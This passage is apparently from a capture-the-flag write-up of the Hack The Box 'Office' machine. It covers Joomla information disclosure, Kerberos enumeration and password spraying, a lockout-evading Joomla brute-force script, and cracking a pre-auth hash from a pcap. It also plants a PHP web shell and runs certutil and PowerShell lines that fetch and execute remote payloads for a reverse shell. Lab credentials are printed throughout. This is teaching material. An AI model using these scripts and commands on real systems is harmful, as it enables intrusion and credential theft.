301      GET        9l       30w      338c http://office.htb/components => http://office.htb/components/
301      GET        9l       30w      346c http://office.htb/administrator/help => http://office.htb/administrator/help/
301      GET        9l       30w      346c http://office.htb/administrator/logs => http://office.htb/administrator/logs/
301      GET        9l       30w      350c http://office.htb/administrator/includes => http://office.htb/administrator/includes/
301      GET        9l       30w      350c http://office.htb/administrator/language => http://office.htb/administrator/language/
403      GET       11l       47w      419c http://office.htb/licenses
403      GET        9l       30w      300c http://office.htb/libraries
MSG      0.000 feroxbuster::heuristics detected directory listing: http://office.htb/administrator/help (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://office.htb/administrator/help/en-GB (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://office.htb/administrator/includes (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://office.htb/administrator/language (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://office.htb/media/system/js/ (Apache)
```


## 389 - LDAP

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ ldapsearch -H "ldap://$(pt get rhost)" -x -s base namingcontexts

# extended LDIF

#

# LDAPv3

# base <> (default) with scope baseObject

# filter: (objectclass=*)

# requesting: namingcontexts

#


#
dn:
namingcontexts: DC=office,DC=htb
namingcontexts: CN=Configuration,DC=office,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=office,DC=htb
namingcontexts: DC=DomainDnsZones,DC=office,DC=htb
namingcontexts: DC=ForestDnsZones,DC=office,DC=htb


# search result
search: 2
result: 0 Success


# numResponses: 2

# numEntries: 1
```

No anonymous binding enabled

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ ldapsearch -H "ldap://$(pt get rhost)" -x -b "DC=office,DC=htb" | tee enum/ldap_all.txt

# extended LDIF

#

# LDAPv3

# base <DC=office,DC=htb> with scope subtree

# filter: (objectclass=*)

# requesting: ALL

#


# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090CF8, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4f7c


# numResponses: 1
```

## 445 - SMB


### Auth

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ nxc smb $(pt get rhost) -u '' -p ''
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] office.htb\: STATUS_ACCESS_DENIED

┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ nxc smb $(pt get rhost) -u 'a' -p ''
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] office.htb\a: STATUS_LOGON_FAILURE
```

# User Flag
---

## Auth as dwolfe


### Joomla! information disclosure (Unauthenticated) (CVE-2023-23752)

Identify version **Joomla!** version

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ curl "http://$(pt get rhost)/administrator/manifests/files/joomla.xml"
<?xml version="1.0" encoding="UTF-8"?>
<extension type="file" method="upgrade">
        <name>files_joomla</name>
        <author>Joomla! Project</author>
        <authorEmail>admin@joomla.org</authorEmail>
        <authorUrl>www.joomla.org</authorUrl>
        <copyright>(C) 2019 Open Source Matters, Inc.</copyright>
        <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
        <version>4.2.7</version>
        <creationDate>2023-01</creationDate>
[...]
```

Google : `Joomla 4.2.7 exploit`

> https://github.com/Acceis/exploit-CVE-2023-23752

We can view config at `/api/index.php/v1/config/application?public=true` without authentication

```bash
curl "http://$(pt get rhost)/api/index.php/v1/config/application?public=true" -s | jq .
```

![](/assets/obsidian/f3a288ed74f7239293eae51dcecdfebe.png)

The exploit POC will parse config for us

```bash
git clone https://github.com/Acceis/exploit-CVE-2023-23752
cd exploit-CVE-2023-23752
```

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/CVE/exploit-CVE-2023-23752]
└─$ ruby ./exploit.rb http://office.htb
Users
[474] Tony Stark (Administrator) - Administrator@holography.htb - Super Users

Site info
Site name: Holography Industries
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: root
DB password: H0lOgrams4reTakIng0Ver754!
DB name: joomla_db
DB prefix: if2tx_
DB encryption 0
```

### Enumerate usernames and spray password


#### Based on info gathered

Now I have a username and password

```bash
[474] Tony Stark (Administrator) - Administrator@holography.htb - Super Users
DB password: H0lOgrams4reTakIng0Ver754!
```

Tried to generate possible usernames based on `Tony Stark`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ /opt/sectools/misc/username-anarchy/username-anarchy -i <(echo 'Tony Stark') > usernames.txt
```

Sync time with DC to avoid errors

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ sudo ntpdate -u $(pt get ip)
2024-02-23 18:03:58.260538 (+0800) +0.000066 +/- 0.029728 10.10.11.3 s1 no-leap
```

Kerbrute

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ kerbrute userenum -d $(pt get rhost) --dc DC.office.htb usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 02/23/24 - Ronnie Flathers @ropnop

2024/02/23 18:38:07 >  Using KDC(s):
2024/02/23 18:38:07 >   DC.office.htb:88

2024/02/23 18:38:07 >  [+] VALID USERNAME:       tstark@office.htb
2024/02/23 18:38:07 >  Done! Tested 14 usernames (1 valid) in 0.130 seconds
```

Tried the password on `tstark` but failed

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ nxc smb $(pt get rhost) -u 'tstark' -p 'H0lOgrams4reTakIng0Ver754!'
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] office.htb\tstark:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
```

#### Based on wordlist

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ kerbrute userenum -o kerbrute.txt -d $(pt get rhost) --dc DC.office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 02/23/24 - Ronnie Flathers @ropnop

2024/02/23 18:21:24 >  Using KDC(s):
2024/02/23 18:21:24 >   DC.office.htb:88

2024/02/23 18:21:36 >  [+] VALID USERNAME:       administrator@office.htb
2024/02/23 18:22:52 >  [+] VALID USERNAME:       Administrator@office.htb
2024/02/23 18:23:31 >  [+] VALID USERNAME:       ewhite@office.htb
2024/02/23 18:23:31 >  [+] VALID USERNAME:       etower@office.htb
2024/02/23 18:23:31 >  [+] VALID USERNAME:       dwolfe@office.htb
2024/02/23 18:23:32 >  [+] VALID USERNAME:       dlanor@office.htb
2024/02/23 18:23:32 >  [+] VALID USERNAME:       dmichael@office.htb
2024/02/23 18:39:14 >  [+] VALID USERNAME:       hhogan@office.htb
2024/02/23 18:43:41 >  [+] VALID USERNAME:       DWOLFE@office.htb
```

Spray the password on users

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ cat kerbrute.txt | grep -F '[+] VALID USERNAME' | awk '{print $7}' | awk -F'@' '{print $1}' > users_ad.lst

┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ /opt/sectools/ad/smartbrute/smartbrute.py brute -bU users_ad.lst -bp 'H0lOgrams4reTakIng0Ver754!' kerberos -d $(pt get rhost) --use-ldaps

/opt/sectools/ad/smartbrute/smartbrute.py:1727: DeprecationWarning: Nesting argument groups is deprecated.
  kerberos_credentials = kerberos_secrets.add_argument_group("credentials to use")
[*] Starting bruteforce attack on passwords
┌────────────┬────────┬────────────────────────────┬─────────┐
│ domain     │ user   │ password                   │ details │
├────────────┼────────┼────────────────────────────┼─────────┤
│ office.htb │ dwolfe │ H0lOgrams4reTakIng0Ver754! │         │
└────────────┴────────┴────────────────────────────┴─────────┘
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ nxc smb $(pt get rhost) -u 'dwolfe' -p 'H0lOgrams4reTakIng0Ver754!'
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754!

┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ nxc winrm $(pt get rhost) -u 'dwolfe' -p 'H0lOgrams4reTakIng0Ver754!'
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb)
WINRM       10.10.11.3      5985   DC               [-] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754!
```

## Auth as tstark


### Enumeration

Once we got auth, 3 common workflow:

- Enumerate SMB Shares
- Enumerate AD objects
- Enumerate more users -> Password spray

#### Shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ nxc smb $(pt get rhost) -u 'dwolfe' -p 'H0lOgrams4reTakIng0Ver754!' --shares
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754!
SMB         10.10.11.3      445    DC               [*] Enumerated shares
SMB         10.10.11.3      445    DC               Share           Permissions     Remark
SMB         10.10.11.3      445    DC               -----           -----------     ------
SMB         10.10.11.3      445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.3      445    DC               C$                              Default share
SMB         10.10.11.3      445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.3      445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.3      445    DC               SOC Analysis    READ
SMB         10.10.11.3      445    DC               SYSVOL          READ            Logon server share
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ smbclient "//$(pt get rhost)/SOC Analysis" -U 'dwolfe%H0lOgrams4reTakIng0Ver754!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu May 11 02:52:24 2023
  ..                                DHS        0  Wed Feb 14 18:18:31 2024
  Latest-System-Dump-8fbc124d.pcap      A  1372860  Mon May  8 08:59:00 2023

                6265599 blocks of size 4096. 1094597 blocks available
smb: \> get Latest-System-Dump-8fbc124d.pcap
getting file \Latest-System-Dump-8fbc124d.pcap of size 1372860 as Latest-System-Dump-8fbc124d.pcap (1725.5 KiloBytes/sec) (average 1725.5 KiloBytes/sec)
```

There were no easy secrets in the `pcap`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ /opt/sectools/harvesting/PCredz/Pcredz -v -f loot/smb/Latest-System-Dump-8fbc124d.pcap
Pcredz 2.0.2
Author: Laurent Gaffie
Please send bugs/comments/pcaps to: laurent.gaffie@gmail.com
This script will extract NTLM (HTTP,LDAP,SMB,MSSQL,RPC, etc), Kerberos,
FTP, HTTP Basic and credit card data from a given pcap file or from a live interface.

CC number scanning activated

Unknown format, trying TCPDump format


loot/smb/Latest-System-Dump-8fbc124d.pcap parsed in: 0.452 seconds (File size 1.31 Mo).
```

#### AD

> https://github.com/franc-pentest/ldeep

```bash
mkdir -p ldeep && ldeep ldap -u 'dwolfe' -p 'H0lOgrams4reTakIng0Ver754!' -d $(pt get rhost) -s ldaps://$(pt get rhost) all ldeep/
```

- No custom attributes found in `users`
- `web_account`, `tstark`, `dwolfe`, `HHogan`, `PPotts` have logged on recently

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ cat ldeep/*_users_all.json | jq 'map(del(.accountExpires,.badPasswordTime,.badPwdCount,.c,.cn,.codePage,.company,.countryCode,.dSCorePropagationData,.distinguishedName,.dn,.givenName,.instanceType,.l,.lastLogoff,.lastLogon,.logonCount,.mail,.name,.objectCategory,.objectClass,.objectGUID,.objectSid,.postalCode,.primaryGroupID,.pwdLastSet,.sAMAccountType,.sn,.st,.streetAddress,.uSNChanged,.uSNCreated,.whenChanged,.whenCreated,.memberOf,.logonHours,.isCriticalSystemObject,.showInAdvancedViewOnly,.lockoutTime)) | sort_by(.lastLogonTimestamp)'| sed -E -e 's/DONT_REQUIRE|servicePrincipalName/\x1b[31m&\x1b[0m/g' -e 's/DONT_EXPIRE|adminCount/\x1b[33m&\x1b[0m/'
```

![](/assets/obsidian/1c46ff268ff8b385f97fd27c8f258b7b.png)

- No users that have attribute : `UserAccountControl -> UF_DONT_REQUIRE_PREAUTH` (**Asreproast**) or `ServicePrincipalName` (**Kerberoast**)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ cat ldeep/*_users_nokrbpreauth.json | jq .
[]

┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ cat ldeep/*_users_spn.json | jq .
[]
```

- `tstark` and `PPotts` have a none default group : `Registry Editors`
- `HHogan` have `GPO Managers` and `Remote Management Users` groups, it could be instant root

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ cat ldeep/*_users_all.json | jq 'map(select(.memberOf != null)) | reduce .[] as $item ({}; .[$item.memberOf[0]] += [$item.sAMAccountName])'
{
  "CN=Registry Editors,CN=Users,DC=office,DC=htb": [
    "tstark",
    "PPotts"
  ],
  "CN=GPO Managers,CN=Users,DC=office,DC=htb": [
    "HHogan"
  ],
  "CN=Denied RODC Password Replication Group,CN=Users,DC=office,DC=htb": [
    "krbtgt"
  ],
  "CN=Guests,CN=Builtin,DC=office,DC=htb": [
    "Guest"
  ],
  "CN=Group Policy Creator Owners,CN=Users,DC=office,DC=htb": [
    "Administrator"
  ]
}
```

- No custom attributes in `groups`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ cat ldeep/*_groups.json | jq 'map(select(.isCriticalSystemObject != true)) | map(del(.cn,.dSCorePropagationData,.dn,.groupType,.instanceType,.name,.objectClass,.objectGUID,.sAMAccountName,.sAMAccountType,.uSNChanged,.uSNCreated,.whenCreated,.objectCategory,.member)) | sort_by(.whenChanged)'
[
  {
    "description": [
      "DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers)."
    ],
    "distinguishedName": "CN=DnsUpdateProxy,CN=Users,DC=office,DC=htb",
    "objectSid": "S-1-5-21-1199398058-4196589450-691661856-1102",
    "whenChanged": "2023-04-14T22:15:38+00:00"
  },
  {
    "description": [
      "DNS Administrators Group"
    ],
    "distinguishedName": "CN=DnsAdmins,CN=Users,DC=office,DC=htb",
    "objectSid": "S-1-5-21-1199398058-4196589450-691661856-1101",
    "whenChanged": "2023-04-14T22:15:38+00:00"
  },
  {
    "distinguishedName": "CN=GPO Managers,CN=Users,DC=office,DC=htb",
    "objectSid": "S-1-5-21-1199398058-4196589450-691661856-1117",
    "whenChanged": "2023-05-10T16:48:34+00:00"
  },
  {
    "description": [
      "Members of this group are allowed to modify certain registry keys for testing and debugging purposes"
    ],
    "distinguishedName": "CN=Registry Editors,CN=Users,DC=office,DC=htb",
    "objectSid": "S-1-5-21-1199398058-4196589450-691661856-1106",
    "whenChanged": "2024-01-17T23:55:25+00:00"
  }
]
```

### Password spraying


#### AD (Failed) 

Spray password against AD again since we got all usernames

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ cat ldeep/*_users_all.json | jq '.[].sAMAccountName' -r > users_ad.lst

┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ /opt/sectools/ad/smartbrute/smartbrute.py brute -bU users_ad.lst -bp 'H0lOgrams4reTakIng0Ver754!' kerberos -d $(pt get rhost) --use-ldaps

/opt/sectools/ad/smartbrute/smartbrute.py:1727: DeprecationWarning: Nesting argument groups is deprecated.
  kerberos_credentials = kerberos_secrets.add_argument_group("credentials to use")
[*] Starting bruteforce attack on passwords
┌────────────┬────────┬────────────────────────────┬──────────┐
│ domain     │ user   │ password                   │ details  │
├────────────┼────────┼────────────────────────────┼──────────┤
│ office.htb │ dwolfe │ H0lOgrams4reTakIng0Ver754! │          │
│ office.htb │ krbtgt │ n/a                        │ disabled │
│ office.htb │ Guest  │ n/a                        │ disabled │
└────────────┴────────┴────────────────────────────┴──────────┘
```

#### Joomla! (Failed) 

Wrote a python script to brute force **joomla!** login page, it will grab CSRF tokens and bypass **brute force** protection by rotating cookies and  `X-Forwarded-For` header value

> `joomla_brute.py`

```python
import requests
import re
import random
import time
import sys

URL = "http://office.htb/administrator/"
USER_LIST = "./users.txt"
PASS_LIST="./pass.txt"


def init_session() -> tuple[str, str, str]:
    r = requests.get(URL)
    cookies = r.cookies
    csrf_1 = re.search(r'type="hidden" name="return" value="(.*?)"',r.text).group(1)
    csrf_2 = re.search(r'type="hidden" name="(.*?)" value="1">', r.text).group(1)
    return cookies, csrf_1, csrf_2

def login(user, password):
    print(f"{user}:{password}")
    cookies, csrf_1, csrf_2 = init_session()
    data = {
        "username": user,
        "passwd": password,
        "option": "com_login",
        "task": "login",
        "return": csrf_1,
        csrf_2: "1"
    }
    headers = {
        "X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
    }
    r = requests.post(URL, data=data, headers=headers, cookies=cookies)
    if not "Username and password do not match" in r.text:
        print(f"[*] Success - {user} : {password}")
        return True


with open(USER_LIST, "r") as user_file:
    with open(PASS_LIST, "r") as pass_file:
        for user in user_file:
            user = user.strip()
            for password in pass_file:
                password = password.strip()
                if login(user, password):
                    sys.exit(0)
            pass_file.seek(0)
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ cat users.txt
web_account
tstark
dlanor
dmichael
dwolfe
etower
EWhite
HHogan
PPotts
Guest
Administrator

┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ cat pass.txt
H0lOgrams4reTakIng0Ver754!
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ python joomla_brute.py
web_account:H0lOgrams4reTakIng0Ver754!
tstark:H0lOgrams4reTakIng0Ver754!
dlanor:H0lOgrams4reTakIng0Ver754!
dmichael:H0lOgrams4reTakIng0Ver754!
dwolfe:H0lOgrams4reTakIng0Ver754!
etower:H0lOgrams4reTakIng0Ver754!
EWhite:H0lOgrams4reTakIng0Ver754!
HHogan:H0lOgrams4reTakIng0Ver754!
PPotts:H0lOgrams4reTakIng0Ver754!
Guest:H0lOgrams4reTakIng0Ver754!
Administrator:H0lOgrams4reTakIng0Ver754!
```

### ASREQroast - Extract encrypted hash from pcap

> Explanations about **ASREQroast** -  https://www.thehacker.recipes/a-d/movement/kerberos/asreqroast

Open the pcap with **wireshark**. Looking at `protocol hierarchy statistics`, there were mostly `TLS` connections, and a lower percentage of `SMB` and `Kerberos` packets

![](/assets/obsidian/b70b78a8f2c639ec7e407e8c1a26beeb.png)

Apply `kerberos` as filter, we'll see some `AS-REQ` packets

![](/assets/obsidian/ab582088d0c0a984855a321187c559c6.png)

In the second `kerberos` packet, there's the `encrypted timestamps` that contains user password

![](/assets/obsidian/bc45396dbdddac5e5903df11399db4c1.png)

The request was made by `tstark`

![](/assets/obsidian/d99dc26c0a7725911f855a4f277cd5ed.png)

> The hash can be found by **Network Miner** with a proper format for **hashcat**
> 
> ![](/assets/obsidian/644d6b58cf334777f1080d25c4363dde.png)
{: .prompt-tip }

### Crack kerberos pre-auth hash

Search `pre-auth`, `etype 18` from [hashcat example formats](https://hashcat.net/wiki/doku.php?id=example_hashes)

The mode is `19900`

![](/assets/obsidian/22dec740a03e904ce30e78c9ab43114f.png)

To fit the format for hashcat, I need the format as below

```r
$krb5pa$18$<USER>$<DOMAIN>$<HASH>
```

It becomes this

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ cat loot/as-req.hash
$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
```

Crack the hash

```bash
hashcat loot/as-req.hash /opt/wordlists/rockyou.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ hashcat loot/as-req.hash /opt/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

19900 | Kerberos 5, etype 18, Pre-Auth | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69
```

The cred is valid

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ nxc smb $(pt get rhost) -u 'tstark' -p 'playboy69'
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [+] office.htb\tstark:playboy69
```

## Shell as web_account


### Password sparying


#### AD (Failed)

```bash
/opt/sectools/ad/smartbrute/smartbrute.py brute -bU users_ad.lst -bP pass.txt kerberos -d $(pt get rhost) --use-ldaps
```

#### Joomla! (Success)

In order to not exceed **joomla!**'s login failed threshold, make sure to only spray the new obtained password

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ echo 'playboy69' > pass.txt

┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ python joomla_brute.py
web_account:playboy69
tstark:playboy69
dlanor:playboy69
dmichael:playboy69
dwolfe:playboy69
etower:playboy69
EWhite:playboy69
HHogan:playboy69
PPotts:playboy69
Guest:playboy69
Administrator:playboy69
[*] Success - Administrator : playboy69
```

### Joomla panel to RCE

> https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce

After login with `Administrator` account, it's easy to gain RCE by editing php files

![](/assets/obsidian/d0b6bf356ed5247ff5a361dd7e0f7d66.png)

![](/assets/obsidian/c9fa39de163351f44f19f635e8221c11.png)

![](/assets/obsidian/f2a9604eeec2a0ed4484388838cf2be8.png)

![](/assets/obsidian/1c98fa6d6c837587beeffc0c2a26f651.png)

On windows, newlines are encouraged for **php** in order not to mess up with the encodings

```php
<?php

system($_REQUEST[0]);

?>
```

![](/assets/obsidian/9c4326d811f4bb2ce1e98e131fd3424d.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ curl "http://$(pt get rhost)/templates/cassiopeia/error.php" -s --data-urlencode '0=whoami'
office\web_account
```

### Reverse SSH - Interactive shell

> https://github.com/NHAS/reverse_ssh

Start server

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ cd /opt/sectools/c2/reverse_ssh/bin && ./server 0.0.0.0:443
2024/02/23 22:39:25 Loading files from /opt/sectools/c2/reverse_ssh/bin
2024/02/23 22:39:25 Version:  v2.4.1
2024/02/23 22:39:25 Listening on 0.0.0.0:443
2024/02/23 22:39:25 Loading private key from: /opt/sectools/c2/reverse_ssh/bin/id_ed25519
2024/02/23 22:39:25 Server key fingerprint:  fe76708014a97adea5673c27edf4800c7ec45dc51f90612dfb08593b0ebcd2e2
2024/02/23 22:39:25 Loading authorized keys from: /opt/sectools/c2/reverse_ssh/bin/authorized_keys
2024/02/23 22:39:25 Was unable to read webhooks configuration file
```

Build the client

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh]
└─$ RSSH_HOMESERVER=10.10.14.99:443 make
```

Download and start the client

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ curl "http://$(pt get rhost)/templates/cassiopeia/error.php" -s --data-urlencode '0=certutil -urlcache -split -f http://10.10.14.99/client.exe \programdata\client.exe && \programdata\client.exe'
```

Connect to the client, now I have **ssh**'s functionalities

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ ssh 127.0.0.1 -p 443 ls -t
Warning: Permanently added '[127.0.0.1]:443' (ED25519) to the list of known hosts.
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 56a9e56946a72aa33b98e0b0b3d223b3ee336935 | SSH-v2.4.1-windows_amd64 |
| e9fa95257de800475369fb27e143ed95761f7858 |                          |
| office.web_account.dc                    |                          |
| 10.10.11.3:49740                         |                          |
+------------------------------------------+--------------------------+

┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ ssh -J 127.0.0.1:443 office.web_account.dc
Warning: Permanently added '[127.0.0.1]:443' (ED25519) to the list of known hosts.
Warning: Permanently added 'office.web_account.dc' (ED25519) to the list of known hosts.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\xampp\htdocs\joomla\templates\cassiopeia>
```

## Shell as tstark


### Enum

```bash
PS C:\xampp\htdocs\joomla\templates\cassiopeia> whoami /all

USER INFORMATION
----------------

User Name          SID
================== =============================================
office\web_account S-1-5-21-1199398058-4196589450-691661856-1118


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

### RunasCS

```bash
PS C:\Windows\system32> iex (new-object net.webclient).DownloadString('http://10.10.14.99/Invoke-RunasCs.ps1')
PS C:\Windows\system32> Invoke-RunasCs "tstark" "playboy69" "C:\programdata\client.exe"
[*] Warning: The logon for user 'tstark' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

2024/02/23 06:55:38 Forking
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ ssh 127.0.0.1 -p 443 ls -t
Warning: Permanently added '[127.0.0.1]:443' (ED25519) to the list of known hosts.
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 5cf724186f8a64c52d2e65aa982c9ce432bcda1a | SSH-v2.4.1-windows_amd64 |
| e9fa95257de800475369fb27e143ed95761f7858 |                          |
| office.web_account.dc                    |                          |
| 10.10.11.3:49799                         |                          |
+------------------------------------------+--------------------------+
| 99ff6c10682cb855f4d844b59010e4f02ee477dc | SSH-v2.4.1-windows_amd64 |
| e9fa95257de800475369fb27e143ed95761f7858 |                          |
| office.tstark.dc                         |                          |
| 10.10.11.3:49838                         |                          |
+------------------------------------------+--------------------------+

┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ ssh -J 127.0.0.1:443 office.tstark.dc
Warning: Permanently added '[127.0.0.1]:443' (ED25519) to the list of known hosts.
Warning: Permanently added 'office.tstark.dc' (ED25519) to the list of known hosts.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
office\tstark
PS C:\Windows\system32> cat C:\Users\tstark\Desktop\user.txt
3d5f1e6919ee96024fc9eb47ab02f341
```

# Root Flag
---

## Shell as ppotts


### Enum

```bash
PS C:\Windows\system32> whoami /all

USER INFORMATION
----------------

User Name     SID
============= =============================================
office\tstark S-1-5-21-1199398058-4196589450-691661856-1114


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Group used for deny only
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
